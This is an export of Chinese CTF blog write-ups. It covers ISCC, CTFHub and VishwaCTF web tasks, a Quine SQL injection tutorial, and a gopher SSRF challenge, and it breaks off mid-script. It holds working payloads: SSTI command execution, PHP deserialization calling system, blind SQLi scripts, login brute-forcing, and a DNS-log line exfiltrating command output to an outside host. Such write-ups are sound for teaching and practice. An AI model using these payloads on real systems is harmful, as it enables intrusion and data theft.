[{"title":"ISCC个人挑战赛之练武题部分WP","url":"/2023/05/11/ISCC个人挑战赛之练武题部分WP/","content":"\n# MISC\n\n## 好看的维吾尔族小姐姐\n\n附件下载解压出来是一个没有后缀的名为“古力娜扎”的文件，使用winhex打开：\n\n![winhex打开古力娜扎](image-2023-05-06 165928.png)\n\n根据文件头判断是PNG图片，将文件后缀进行更改，得到一张图片：\n\n![古力娜扎](image-20230511213549906.png)\n\n图片很小，看起来比例也有点怪，根据经验怀疑是更改了大小，所以直接上010editor把大小改一下：\n\n![010editor](image-20230512142836658.png)\n\n在这里调用png的模板，把高度改的大一点，之后保存发现图片的下方藏着一张\"二维码\"：\n\n![更改高度后图片](image-20230512142959864.png)\n\n看起来像传统意义上的二维码，实际上又不是。这是一种特殊形式的二维码：**Data Matrix码**。通过一些其他的二维码扫描软件可以得到一串比较特殊的代码：\n\n![代码](image-2023-05-06 170125.png)\n\n这不就是反过来的unicode么！这时候才联想到题目的提示：维吾尔族同胞的说话方式，莫非是反着说？不太了解，把字符串反过来unicode解码拿到flag：\n\n![flag](image-2023-05-06 170146.png)\n\n# WEB\n\n## 羊了个羊\n\n题目上来玩游戏啊，第一关第二关无穷无尽。看到上面有三个按钮，充值关卡和上一关均正常使用，冲关秘技被disable了，查看一下页面源码：\n\n```html\n     <button class=\"btn\" @click=\"handleIscc\" disabled = true>冲关秘技</button>\n```\n\n这个button绑定了一个点击事件handleIscc，既然如此就在js中找一找这个：\n\n```js\nconst handleIscc = () =>{\n            data.cards.length = 3;\n            data.select.clear();\n          }\nconst handleSwitch = (type) => {\n\tif(type === 'prev') {\n    \tif(data.level === 1) {\n                window.alert('反向上分不行哦~');\n                return;\n              }\n              data.level--;\n    } else {\n      \tif(data.level === 100) {\n                window.alert('迎接你的最终挑战！');\n                return;\n              }\n```\n\n也能草草看到一些逻辑，通关100关才给flagQwQ，那就继续向下分析：\n\n```js\nif (!hasCards.length && level >= config.maxLevel) {\n                  {\n                  alert(\"U1ZORFEzdFJUVEJWWTNWNVEydFhkemRTY3pSME1UVmlibGt6T1U1TFZGWnRNemcyYUgwPQ==\");\n                  data.level = 1;\n                }\n\t\t\t}\n```\n\n这里首先一个判断是否还有剩余的没有消除掉的卡片，如果没有并且此时的层数大于设定的层数就会alert这段base64加密后的字符串，解密之后即为flag。\n\n## 小周的密码锁\n\n题目打开是四个表项，前三个已经分别填好了123，随便填一个之后再burpsuite中抓到验证的包，送到intruder模块单字符开爆！发包间隔要高，我试的1200ms间隔（没挂代理别给我ip封了）。说来也是碰巧，提交的get请求有两项：\n\n> http://47.94.14.162:10008/?password=4&password2=1\n\n按理说应该爆第一个password的来着，结果第一次爆成了password2，误打误撞一次成功：\n\n![burpsuite爆破](image-2023-05-10 152254.png)\n\n得到password2是5，直接访问得到php源码：\n\n```php\n<?php\n    function MyHashCode($str)\n    {\n        $h = 0;\n        $len = strlen($str);\n        for ($i = 0; $i < $len; $i++) {\n            $hash = intval40(intval40(40 * $hash) + ord($str[$i]));\n        }\n        return abs($hash);\n    }\n    \n    function intval40($code)\n    {\n        $falg = $code >> 32;\n        if ($falg == 1) {\n            $code = ~($code - 1);\n            return $code * -1;\n        } else {\n            return $code;\n        }\n    }\n    function Checked($str){\n        $p1 = '/ISCC/';\n        if (preg_match($p1, $str)){\n            return false;\n        }\n        return true;\n    }\n\n    function SecurityCheck($sha1,$sha2,$user){\n        \n        $p1 = '/^[a-z]+$/';\n        $p2 = '/^[A-Z]+$/';\n\n        if (preg_match($p1, $sha1) && preg_match($p2, $sha2)){\n            $sha1 = strtoupper($sha1);\n            $sha2 = strtolower($sha2);\n            $user = strtoupper($user);\n            $crypto = $sha1 ^ $sha2;\n        }\n        else{\n            die(\"wrong\");\n        }       \n\n        return array($crypto, $user);\n    }\n    error_reporting(0);\n    \n    $user = $_GET['username'];//user\n    $sha1 = $_GET['sha1'];//sha1\n    $sha2 = $_GET['‮⁦//sha2⁩⁦sha2'];\n    //‮⁦see me ⁩⁦can you \n\n    if (isset ($_GET['password'])) {\n        if ($_GET['password2'] == 5){\n            show_source(__FILE__);\n        }\n        else{\n            //Try to encrypt\n            if(isset($sha1) && isset($sha2) && isset($user)){\n                [$crypto, $user] = SecurityCheck($sha1,$sha2,$user);\n                if((substr(sha1($crypto),-6,6) === substr(sha1($user),-6,6)) && (substr(sha1($user),-6,6)) === 'a05c53'){//welcome to ISCC\n                    \n                    if((MyHashcode(\"ISCCNOTHARD\") === MyHashcode($_GET['password']))&&Checked($_GET['password'])){\n                        include(\"f1ag.php\");\n                        echo $flag;\n                    }else{\n                        die(\"就快解开了!\");\n                    }\n                    \n                }\n                else{\n                    die(\"真的想不起来密码了吗?\");\n                }\n            }else{\n                die(\"密钥错误!\");\n            }\n        }    \n    }        \n\n    mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 1e4) + rand(1, 1e4));\n?>\n```\n\n开始分析，首先定义了四个函数MyHashCode、intval40、Checked以及SecurityCheck。之后get接收变量username、sha1以及“sha2”，这里sha2标引好是因为变量名并不是sha2：\n\n![sha2](image-20230512151205415.png)\n\n在vscode中可以看到get的变量名称有些怪，这里涉及到一些特殊的unicode字符，这些字符控制着整体字符串的打印方式，可以参考：\n\n> [这个符号竟然可以从右往左打印字符串 (qq.com)](https://mp.weixin.qq.com/s/lo2AiEloACLtCn2Ncle33A)\n\n解决办法就是提前进行url编码，传入时直接传入url编码：\n\n```php\n<?php\n$a = '‮⁦//sha2⁩⁦sha2';\necho urlencode($a);\n?>\n//%E2%80%AE%E2%81%A6%2F%2Fsha2%E2%81%A9%E2%81%A6sha2\n```\n\nok，下面继续分析。因为我们已经get传入了password，所以第一层if可以进入，并且第二层的password2=5也已经被我们爆出来了，我们需要进入到第二层if的else分支，password2不为5即可。之后第三层if需要传入username,sha1,以及那串特殊字符，进入后调用了SecurityCheck函数,该函数首先判断sha1是否全为小写字母，sha2是否全为大写字母，满足条件后将sha1转成大写，sha2转成小写，user转成大写，返回sha1和sha2的逐位异或和转大写的user。\n\n第四层的if有些棘手，需要让user的sha1值的后六位等于a05c53，同时返回的异或值的sha1值的后六位也等于a05c53。至于user可以写个脚本用递增的数字转字符串计算sha1进行碰撞，很快就能拿到第一个符合条件的：\n\n> user=14987637\n\n第二个的话只需要构造出sha1异或sha2等于user的值即可，随便写了个脚本跑出一张表：\n![异或表](image-20230512153023598.png)\n\n摘取**大写字符^小写字母=数字**的项逐个拼接构造，得到众多结果中的一个：\n\n> $sha1 = 'BBCBEGCE';\n> $sha2 = 'svzzrqpr';\n\n因为这个函数还会大小写相互转换，所以这里要对大小写提前转换一下，上面的是没转换前的。\n\n之后就是第五层的if了。第五层需要传入password，要求是password中不能出现ISCC并且将其传入后得到的结果与ISCCNOTHARD传入后相同。简单分析一下这个MyHashCode函数。这个函数逐位取传入的字符串，每次将hash变量乘以40传入intval40函数并将取到的字符的ascii码相加作为参数传入intval40函数，返回值即为本轮循环后的hash值，尝试本地运行找出每次for循环后的hash值：\n\n> 73|3003|120187|4807547|192301958|7692078399|307683136044|12307325441832|492293017673345|19691720706933882|787668828277355348|\n\n既然不能出现ISCC，那么就从这里作为切入点。看看如果不使用ISCC，能否构造出能够替换的字符串。至于intval40这个函数，看一下chatGPT的解释：\n\n> 这段代码是一个PHP函数，名为intval40，它的作用是将一个64位整数转换为40位整数。具体实现是通过判断最高位是否为1来确定是否需要进行补码操作，然后将结果返回。其中，如果最高位为1，则需要进行补码操作，将其转换为相应的负数。最后，返回40位整数的值。\n\n最高位不是1时直接返回，不会对传入值造成任何影响，那么就来测试一下，看看在开头的处理ISCC字符串时是否有影响：\n\n> 0000000000110000000000\n\n0代表直接返回，1代表进行补码操作，处理字符串时每个字符调用两次intval40，因此前面处理ISCC时intval40没有对hash的值造成任何影响，这样就使题目更加简单了。我们的思路现在变成了能否构造字符串替换ISCC。已知在处理ISCC时intval40不会对hash的值造成影响，因此只要我们构造的**字符串的开头几个字符生成的hash值在某一阶段与ISCCNOTHARD的开头相同，并且其后的字符与其保持一致**，就能够成功绕过这个限制条件，如何构造？已知开头的字符串ISCC四个阶段的hash值分别为73|3003|120187|4807547，我们能否构造出第二阶段的hash值等于73？hash的初值为0，第一次intval40的结果为0，与第一个字符的ascii值相加传入intval40得到第一阶段的hash值即为第一个字符的hash值，如果要在第二阶段的值为73的话，第二个字符的ascii值应为33，ascii中是叹号，因此我们可以将ISCCNOTHARD中的I替换为ascii为1的字符加上叹号，ascii为1的字符是非可见字符，经过url编码后为%01，传入即可拿到flag，最终payload：\n\n```te\npassword=%01!SCCNOTHARD&password2=1&username=14987637&sha1=bbcbegce&%E2%80%AE%E2%81%A6%2F%2F%73%68%61%32%E2%81%A9%E2%81%A6%73%68%61%32=SVZZRQPR\n```\n\n## chatGGG\n\n开头一个简易的对话界面，感觉可能是模板注入，输入双花括号之后符号会消失，+也会转义成“加”等等，还是做了一些过滤的。\n\nSSTI学得比较菜，在一些过滤绕过的文章中找到一些灵感\n\n> https://blog.csdn.net/weixin_52635170/article/details/129850863\n\n使用变量设置以及拼接的方式进行绕过，不妨从构造好的payload入手：\n\n```te\nask={%set pop=dict(po=a,p=b)|join%}\n{%set xiahuaxian=(lipsum|string|list)|attr(pop)(24)%}\n{%set kongge=(lipsum|string|list)|attr(pop)(9)%}\n{%set globals=(xiahuaxian,xiahuaxian,dict(glob=b,als=a)|join,xiahuaxian,xiahuaxian)|join%}\n{%set get=dict(g=b,et=a)|join%}\n{%set shell=dict(o=a,s=b)|join%}\n{%set popen=dict(po=b,pen=a)|join%}\n{%set builtins=(xiahuaxian,xiahuaxian,dict(buil=b,tins=a)|join,xiahuaxian,xiahuaxian)|join%}\n{%set ch=dict(ch=a,r=b)|join%}\n{%set char=(lipsum|attr(globals))|attr(get)(builtins)|attr(get)(ch)%}\n{%set command=(char(99),char(97),char(116),char(32),char(102),char(108),char(108),char(108),char(97),char(97),char(103),char(46),char(116),char(120),char(116))|join%}\n{%set read=dict(re=b,ad=a)|join%}\n{%set result=(lipsum|attr(globals))|attr(get)(shell)|attr(popen)(command)|attr(read)()%}\n{%print result%}\n```\n\n由于做了一些特殊符号以及单词的过滤，因此需要进行拼接构造或从其他位置取得，例如下划线，则是从**lipsum|string|list**中取得，lipsum是flask的一个方法，string则是转化为字符串，list则是将字符串转化为列表\n\n![lipsum](image-20230525205644417.png)\n\n第24个字符为下划线，因此使用pop（24）可以截取到下划线。\n\n``` tex\n1. lipsum|attr(\"__globals__\") 相当于 lipsum.__globals__\n2. (1,2)|join 相当于 12\n3. dit(a=1,b=2) 即将字典中的键进行拼接\n\n通过以上这些方法即可构造出与\n{%print ((lipsum)|attr(\"__globals__\")).get(\"os\").popen(\"cat ./flllaag.txt\").read()%}\n等效的payload\n```\n\n![chatGGG](image-2023-05-19 191223.png)\n\n# 实战题\n\n顺便附上实战第一阶段吧，第一阶段用到了**cve-2018-76602**，直接在网上找了个现成的poc直接打，账号密码弱口令（drupal,drupal）\n\n![实战](image-2023-05-24 164441.png)\n","tags":["CTF_比赛记录"]},{"title":"记一次Quino注入学习","url":"/2023/04/24/记一次Quino注入学习/","content":"\n之前做了一道题看别人的wp不明所以，搁置了一段时间再看豁然开朗。\n\n# 题目：CTFHub_2021-第五空间智能安全大赛-Web-yet_another_mysql_injection\n\n首先进入题目是一个登陆框，看了html源码发现有提示源码位置，进行查看：\n\n``` php\n<?php\ninclude_once(\"lib.php\");\nfunction alertMes($mes,$url){\n    die(\"<script>alert('{$mes}');location.href='{$url}';</script>\");\n}\n \nfunction checkSql($s) {\n    if(preg_match(\"/regexp|between|in|flag|=|>|<|and|\\||right|left|reverse|update|extractvalue|floor|substr|&|;|\\\\\\$|0x|sleep|\\ /i\",$s)){\n        alertMes('hacker', 'index.php');\n    }\n}\n \nif (isset($_POST['username']) && $_POST['username'] != '' && isset($_POST['password']) && $_POST['password'] != '') {\n    $username=$_POST['username'];\n    $password=$_POST['password'];\n    if ($username !== 'admin') {\n        alertMes('only admin can login', 'index.php');//username===admin\n    }\n    checkSql($password);\n    $sql=\"SELECT password FROM users WHERE username='admin' and password='$password';\";\n    $user_result=mysqli_query($con,$sql);\n    $row = mysqli_fetch_array($user_result);\n    if (!$row) {\n        alertMes(\"something wrong\",'index.php');\n    }\n    if ($row['password'] === $password) {//这个是关键\n    die($FLAG);\n    } else {\n    alertMes(\"wrong password\",'index.php');\n  }\n}\n \nif(isset($_GET['source'])){\n  show_source(__FILE__);\n  die;\n}\n?>\n```\n\n题目黑名单不是很死，通过各种符号以及函数的替代也可以注，但是重点不在此，重点在于题目中的判断\n\n> if ($row['password'] === $password)\n\n这样就引入了要学到的内容——Quino注入\n\n# Quino注入\n\nQuine又称为自产生程序，在sql注入中是一种使得输入的sql语句和输出的sql语句一致的技术，就是说输入的语句进行查询后生成的结果与输入的语句相同（自己生成自己），可以看到题目中的判断正是考察了这个点。\n\n## replace函数\n\n> replace(object, search, replace)\n\n此函数用于将object中的所有search替换为replace。\n\n```sql\nMariaDB [(none)]> select replace(\".\", char(46), \"!\");\n+-----------------------------+\n| replace(\".\", char(46), \"!\") |\n+-----------------------------+\n| !                           |\n+-----------------------------+\n1 row in set (0.000 sec)\n```\n\n可以看到能够成功替换。\n\n## 尝试使输入输出保持一致\n\n### 替换object\n\n尝试通过替换object使输入输出保持一致:\n\n``` sql\nMariaDB [(none)]> select replace('replace(\".\",char(46),\".\")',char(46),'.');\n+---------------------------------------------------+\n| replace('replace(\".\",char(46),\".\")',char(46),'.') |\n+---------------------------------------------------+\n| replace(\".\",char(46),\".\")                         |\n+---------------------------------------------------+\n1 row in set (0.000 sec)\n```\n\n还是差一点，只是将object中的字符串原样输出了，replace还没怎么用到，是否可以通过更改replace使输入输出保持一致？\n\n### 替换object+replace\n\n```sql\nMariaDB [(none)]> select replace('replace(\".\",char(46),\".\")',char(46),'replace(\".\",char(46),\".\")');\n+---------------------------------------------------------------------------+\n| replace('replace(\".\",char(46),\".\")',char(46),'replace(\".\",char(46),\".\")') |\n+---------------------------------------------------------------------------+\n| replace(\"replace(\".\",char(46),\".\")\",char(46),\"replace(\".\",char(46),\".\")\") |\n+---------------------------------------------------------------------------+\n1 row in set (0.000 sec)\n```\n\n可以看到确实长得差不多了，但还是有问题，包围object和replace的符号仍然有差异。object中的.被替换为了replace(\".\",char(46),\".\"),但包围.的引号为双引号，如果直接更改为单引号会造成最外层replace的object界限不明确，因此还需要再套一层replace，将双引号改为单引号。\n\n### 解决引号问题\n\n> ```sql\n> replace('\".\"',char(34),char(39))\n> ```\n\n语句将字符串中的双引号替换为了单引号，这就是解决引号问题的方法，即在object外再套一层replace将里面的双引号更改为单引号：\n\n```sql\nMariaDB [(none)]> select replace(replace('replace(replace(\".\",char(34),char(39)),char(46),\".\")',char(34),char(39)),char(46),'replace(replace(\".\",char(34),char(39)),char(46),\".\")');\n+------------------------------------------------------------------------------------------------------------------------------------------------------------+\n| replace(replace('replace(replace(\".\",char(34),char(39)),char(46),\".\")',char(34),char(39)),char(46),'replace(replace(\".\",char(34),char(39)),char(46),\".\")') |\n+------------------------------------------------------------------------------------------------------------------------------------------------------------+\n| replace(replace('replace(replace(\".\",char(34),char(39)),char(46),\".\")',char(34),char(39)),char(46),'replace(replace(\".\",char(34),char(39)),char(46),\".\")') |\n+------------------------------------------------------------------------------------------------------------------------------------------------------------+\n1 row in set (0.000 sec)\n```\n\n此时输入与输出可以保持一致了，先看最上面的一行的绿色部分，由于需要区分字符串的界限，因此字符串的外界（此时为单引号）与字符串内的引号要保持不同（此时为双引号），绿色部分外一层的replace的目的就是为了将字符串内的引号转换为与外界相同的引号（此时为单引号，即将字符串内的双引号改为单引号），这样就好办了，继续进行更外一层的replace，此时能够看到成功进行了Quine注入。\n\n那么如果我在开始直接将字符串的外界定义为双引号，这样字符串内的引号就变成了单引号，这样不就可以简化了嘛？结果是，在这种情况下，待查询语句的外侧变成了双引号，而结果变成了单引号，结果一样不同，因此最内层套的这个replace不能简化。\n\n### 总结\n\nQuine基本形式：\n\n>  replace(replace(‘str’,char(34),char(39)),char(46),‘str’)\n\n先将str里的双引号替换成单引号，再用str替换str里的.\n\nstr基本形式（可以理解成上面的\".\"）：\n\n>  replace(replace(\".\",char(34),char(39)),char(46),\".\")\n\n完整的Quine就是***Quine基本形式+str基本形式***\n\n回头再看题目的payload：\n\n> 1'/**/union/**/select/**/replace(replace('1\"/**/union/**/select/**/replace(replace(\".\",char(34),char(39)),char(46),\".\")#',char(34),char(39)),char(46),'1\"/**/union/**/select/**/replace(replace(\".\",char(34),char(39)),char(46),\".\")#')#\n\nstr:\n\n> 1\"/**/union/**/select/**/replace(replace(\".\",char(34),char(39)),char(46),\".\")#\n\nquine基本形式：\n\n> 1'/**/union/**/select/**/replace(replace('str',char(34),char(39)),char(46),'str')#\n","tags":["CTF_学习记录"]},{"title":"CTFHub_2020-网鼎杯-青龙组-AreUserialz","url":"/2023/04/07/CTFHub-2020-网鼎杯-青龙组-AreUserialz/","content":"\n题目上来直接展示源码：\n\n```php\n<?php\n\ninclude(\"flag.php\");\n\nhighlight_file(__FILE__);\n\nclass FileHandler {\n\n    protected $op;\n    protected $filename;\n    protected $content;\n\n    function __construct() {\n        $op = \"1\";\n        $filename = \"/tmp/tmpfile\";\n        $content = \"Hello World!\";\n        $this->process();\n    }\n\n    public function process() {\n        if($this->op == \"1\") {\n            $this->write();\n        } else if($this->op == \"2\") {\n            $res = $this->read();\n            $this->output($res);\n        } else {\n            $this->output(\"Bad Hacker!\");\n        }\n    }\n\n    private function write() {\n        if(isset($this->filename) && isset($this->content)) {\n            if(strlen((string)$this->content) > 100) {\n                $this->output(\"Too long!\");\n                die();\n            }\n            $res = file_put_contents($this->filename, $this->content);\n            if($res) $this->output(\"Successful!\");\n            else $this->output(\"Failed!\");\n        } else {\n            $this->output(\"Failed!\");\n        }\n    }\n\n    private function read() {\n        $res = \"\";\n        if(isset($this->filename)) {\n            $res = file_get_contents($this->filename);\n        }\n        return $res;\n    }\n\n    private function output($s) {\n        echo \"[Result]: <br>\";\n        echo $s;\n    }\n\n    function __destruct() {\n        if($this->op === \"2\")\n            $this->op = \"1\";\n        $this->content = \"\";\n        $this->process();\n    }\n\n}\n\nfunction is_valid($s) {\n    for($i = 0; $i < strlen($s); $i++)\n        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))\n            return false;\n    return true;\n}\n\nif(isset($_GET{'str'})) {\n\n    $str = (string)$_GET['str'];\n    if(is_valid($str)) {\n        $obj = unserialize($str);\n    }\n\n}\n```\n\n经过分析得知基本流程为定义op为操作数，1为写2为读，在读中分析，首先字符串通过GET以str引入，首先进行is_valid判断，判断是否存在不可打印字符，之后进行反序列化，在process函数中判断op为2调用read函数，读取文件名为变量filename的文件，将返回值赋值给res变量并调用output函数进行输出。\n\ndestruct魔术方法中会自动将op值由2转换为1，但比较类型为强比较，process函数中为弱类型比较，因此传入数字2即可绕过。\n\n构造对应脚本：\n\n```php\n<?php\nclass FileHandler {\n\n    protected $op;\n    protected $filename;\n    protected $content;\n\n    function __construct() {\n        $this -> op = 2;\n        $this -> filename = \"flag.php\";\n        // $this -> content = \"Hello World!\";\n    }\n}\n$a = new FileHandler;\necho(urlencode(serialize($a)));\n?>\n```\n\n发现无任何回显，仔细观察流程发现由于类中的变量属性类型为**protected** ，因此序列化后形如：\n\n![protected](image-20230407210544120.png)\n\n发现在变量名称前出现了%00*%00，无法通过is_valid函数（同样的还有private属性类型，形式为%00类名%00字段名），这里有个小trick：php7.1+版本对属性类型不敏感，本地序列化的时候将属性改为public进行绕过即可\n\n```php\n<?php\nclass FileHandler {\n\n    public $op;\n    public $filename;\n    public $content;\n\n    function __construct() {\n        $this -> op = 2;\n        $this -> filename = \"flag.php\";\n        // $this -> content = \"Hello World!\";\n    }\n}\n$a = new FileHandler;\necho(urlencode(serialize($a)));\n?>\n```\n\n\n\n传入即可拿到flag。\n","tags":["CTF_解题记录"]},{"title":"CTFHub_2022-网鼎杯-朱雀组-phpweb","url":"/2023/04/07/CTFHub-2022-网鼎杯-朱雀组-phpweb/","content":"\n题目上来看到一张背景图，左上角显示实时时间，每5s刷新一次，通过burp查看POST传入了\n\n> func=date&p=Y-m-d%20h%3Ai%3As%20a\n\n猜测第一参数为php函数，第二参数为传入函数的参数。\n\n之后进行fuzz工作，发现ban掉了很多函数，像system、exec等函数均被ban掉，偶然发现highlight_file函数使用正常，可以借助此函数进行源码读取，传入\n\n> func=highlight_file&p=index.php\n\n成功拿到index.php的源码：\n\n```php\n<?php\n$disable_fun = array(\"exec\",\"shell_exec\",\"system\",\"passthru\",\"proc_open\",\"show_source\",\"phpinfo\",\"popen\",\"dl\",\"eval\",\"proc_terminate\",\"touch\",\n\t\"escapeshellcmd\",\"escapeshellarg\",\"assert\",\"substr_replace\",\"call_user_func_array\",\"call_user_func\",\"array_filter\", \"array_walk\",\n\t\"array_map\",\"registregister_shutdown_function\",\"register_tick_function\",\"filter_var\", \"filter_var_array\", \"uasort\", \"uksort\", \"array_reduce\",\n\t\"array_walk\", \"array_walk_recursive\",\"pcntl_exec\",\"fopen\",\"fwrite\",\"file_put_contents\"\n);\nfunction gettime($func, $p) {\n\t$result = call_user_func($func, $p);\n\t$a= gettype($result);\n\tif ($a == \"string\") {\n\treturn $result;\n\t} else {\n\treturn \"\";\n\t}\n}\nclass Test {\n\tvar $p = \"Y-m-d h:i:s a\";\n\tvar $func = \"date\";\n\tfunction __destruct() {\n\tif ($this->func != \"\") {\n\t\techo gettime($this->func, $this->p);\n\t}\n\t}\n}\n$func = $_REQUEST[\"func\"];\n$p = $_REQUEST[\"p\"];\nif ($func != null) {\n\t$func = strtolower($func);\n\tif (!in_array($func,$disable_fun)) {\n\techo gettime($func, $p);\n\t}else {\n\tdie(\"Hacker...\");\n\t}\n}\n?>\n```\n\n可以看到函数黑名单，审计发现可以利用Test类中的__destruct()魔术方法进行命令执行，从此逆推需要一个反序列化函数进行触发，发现unserialize函数不在黑名单中，可以利用，下面构造相应脚本：\n\n```php\n<?php\nclass Test {\n\tvar $p = \"cat /flag*\";\n\tvar $func = \"system\";\n}\n$a = new Test;\necho(urlencode(serialize($a)));\n?>\n```\n\n最终payload：\n\n> func=unserialize&p=O%3A4%3A%22Test%22%3A2%3A%7Bs%3A1%3A%22p%22%3Bs%3A8%3A%22cat+%2Ffl%2A%22%3Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3B%7D\n\n![flag](./image-20230407193913985.png)\n\n成功拿到flag。\n\n\n\n（加上解题记录要不没得写了qwq\n\n","tags":["CTF_解题记录"]},{"title":"VishwaCTF 2023 Web","url":"/2023/04/06/VishwaCTF-2023-Web/","content":"\n# Eeezzy\n\n题目上来直接给源码：\n\n![Eeezzy](./Eeezzy.png)\n\n利用了strcmp函数无法比较数组等其他类型的参数，因此传入数组会使函数出错退出返回NULL。当时同时构造username和password以数组形式传入仅仅只会报错，后来看别人wp发现需要只构造password以数组形式传入才能拿到wp？（一个坑点，本地环境测试两个都构造为数组形式也能拿到flag，后续有研究再补充）\n\n# aLive\n\n![alive题面](./image-20230406212435517.png)\n\n题面顾名思义，使用dnslog工具平台将命令外带，类似于requestbin\n\n![dnslog](./image-20230406213229616.png)\n\n如此，可通过如下构造将命令执行的结果进行外带：\n\n```she\n`whoami`.ks8zy9.dnslog.cn\n```\n\n![dnslog测试](./image-20230406213442239.png)\n\n```shell\n`cat flag*`.ks8zy9.dnslog.cn\n```\n\n拿到flag。\n\n# payload\n\n用dirsearch扫目录，能扫出robots.txt和一个奇怪的GET传参cmd的子目录（之后发现就是要传参cmd）,robots.txt内容：\n\n```php\n<?php\n    if(isset($_GET['cmd'])){\n        system($_GET['cmd']);\n    }\n    else {\n        if(isset($_GET['btn'])){\n            echo \"<b>System Details: </b>\";\n            system(\"uname -a\"); \n        }\n    }\n?>\n\n```\n\n之后测了很多，以为是ssrf之类的，fuzz发现屏蔽了一些系统函数，写webshell也会被自动清空。。。结果flag直接藏在环境变量里，使用命令env查看系统环境变量即可。\n\n![cmd=env](./image-20230406210722466.png)\n\n# spooky\n\n题目上来是个登录界面，使用dirsearch扫一遍目录，发现有一个sitemap.xml文件，文件包含两个文件的路径：\n\n- /creds/users.txt\n- /creds/pass.txt\n\n两个文件分别是一些用户名和密码，对应关系未知，使用burp的intruder模块的cluster bomb模式构造用户名和密码的笛卡尔积并爆破\n\n爆破发现shrekop用户能登陆成功，但权限等级为user，POST传入admin=true即可拿到flag\n\n\n\n### 写在最后\n\n赛后看题解真的不难。。。怎么比赛时候就短路？做题还是少\n","tags":["CTF_比赛记录"]},{"title":"2023数字中国数字人才赛道初赛WEB","url":"/2023/04/02/2023数字中国数字人才赛道初赛WEB/","content":"\n\n\n比赛时间在博客建站之前，题目没有自己截的图，在网上找了几张。\n\n# easy_curl\n\n首先通过php伪协议读取源文件\n\n``` \n?url=file:///var/www/html/index.php\n```\n\n得到index.php源码：\n\n![index.php源码](./image-20230402195715364.png)\n\n同理得到flag.php源码：\n\n![flag.php源码](./image-20230402195821748.png)\n\n通过源码分析可以得到基本逻辑，index.php负责进行过滤和curl访问，flag.php输出变量key和检测访问是否来源于本地，如果是则输出flag。\n\n题目重点在于：\n\n- gophar协议构造http请求\n\n- index.php对内网地址的过滤\n\n## gophar协议构造http请求：\n\n### 构造GET请求：\n\n使用脚本：\n\n```python\nimport urllib\ntest =\\\n\"\"\"GET /ssrf/get.php HTTP/1.1\nHost: 192.168.0.111\n\"\"\"  \ntmp = urllib.parse.quote(test)\nnew = tmp.replace('%0A','%0D%0A')\nresult = 'gopher://sudo.cc:80/'+'_'+new\nresult = urllib.parse.quote(result)\nprint(result)\n```\n\n### 构造POST请求：\n\n包格式与GET不同，需要额外提供请求头Contennt-Type与Content-Length\n\n```python \nimport urllib.parse\npayload =\\\n\"\"\"POST /flag.php HTTP/1.1\nHost: 127.0.0.1\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 36\n\nkey=4208252604f16d7ed834c6bfceb54440\n\"\"\"  \ntmp = urllib.parse.quote(payload)\nnew = tmp.replace('%0A','%0D%0A')\nresult = 'gopher://sudo.cc:80/'+'_'+new\nresult = urllib.parse.quote(result)\nprint(result)       # 这里因为是GET请求所以要进行两次url编码\n```\n\n尤其要注意二次编码问题，因为最终利用index.php的curl时仍要urlencode\n\n## 本地地址过滤绕过\n\n正则表达式过滤了 **localhost、127.0开头的字符串以及中文句号。** 因此可以进行进制转换，例如127.0.0.1转换十进制为 2130706433，进行请求等同于127.0.0.1.\n\n另外一种方法可以访问**sudo.cc**，此域名在经过解析后为127.0.0.1，同样可以进行过滤绕过。\n\n最终payload：\n\n```\nhttp://80.endpoint-453973b83c7545d5a12aef2756506771.s.ins.cloud.dasctf.com:81/?url=gopher://2130706433:80/_%25%35%30%25%34%66%25%35%33%25%35%34%25%32%30%25%32%66%25%36%36%25%36%63%25%36%31%25%36%37%25%32%65%25%37%30%25%36%38%25%37%30%25%32%30%25%34%38%25%35%34%25%35%34%25%35%30%25%32%66%25%33%31%25%32%65%25%33%31%25%30%64%25%30%61%25%34%38%25%36%66%25%37%33%25%37%34%25%33%61%25%32%30%25%33%31%25%33%32%25%33%37%25%32%65%25%33%30%25%32%65%25%33%30%25%32%65%25%33%31%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%63%25%36%35%25%36%65%25%36%37%25%37%34%25%36%38%25%33%61%25%32%30%25%33%33%25%33%36%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%35%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%30%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%32%64%25%37%37%25%37%37%25%37%37%25%32%64%25%36%36%25%36%66%25%37%32%25%36%64%25%32%64%25%37%35%25%37%32%25%36%63%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35%25%36%34%25%30%64%25%30%61%25%30%64%25%30%61%25%36%62%25%36%35%25%37%39%25%33%64%25%36%32%25%33%35%25%33%30%25%33%30%25%33%38%25%36%36%25%33%32%25%33%36%25%33%38%25%36%35%25%36%31%25%36%33%25%36%31%25%33%36%25%36%36%25%33%38%25%33%30%25%36%33%25%36%36%25%33%33%25%33%32%25%36%35%25%33%32%25%33%32%25%33%34%25%33%38%25%33%37%25%33%35%25%33%31%25%33%38%25%36%36%25%33%39\n```\n\n# Simple Message Board\n\nSQL注入，首先使用burp进行fuzz，发现substring函数被ban，使用left函数代替，left函数语法：\n\n```sql\nLEFT(str,length);\n```\n\n函数返回指定长度的字符串的左侧部分。\n\n经过测试注入点在search面板中，贴一个别人的脚本：\n\n```python\nimport requests,string\nurl = \"http://80.endpoint-8c456a973f5a40b1ad419af58b263ad3.s.ins.cloud.dasctf.com:81/index.php?act=search\"\nres =\"\"\nprint(string.printable)\nfor i in range(1,100):\n    print(i)\n    for j in \"0123456789abcdefghijklmnopqrstuvwxyz{}-\":\n        tmp=res\n        tmp+=j\n        payload1 = \"-1'||if((left((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{})='{}'),1,0)#\".format(str(i),tmp)\n        payload1 = \"-1'||if((left((select*from(flag)),{})='{}'),1,0)#\".format(str(i),tmp)\n        #print(payload1)\n        #payload2 = \"admin'^(ascii(mid(database()from {}))>{})^1%23\".format(i,j)\n        data = {\"keyword\":payload1}\n        r = requests.post(url,data=data)\n        if \"Message:Hello, world!\"  in r.text:\n            res=tmp\n            print (res)\n            break\n        if \"What are you doing?\" in r.text:\n            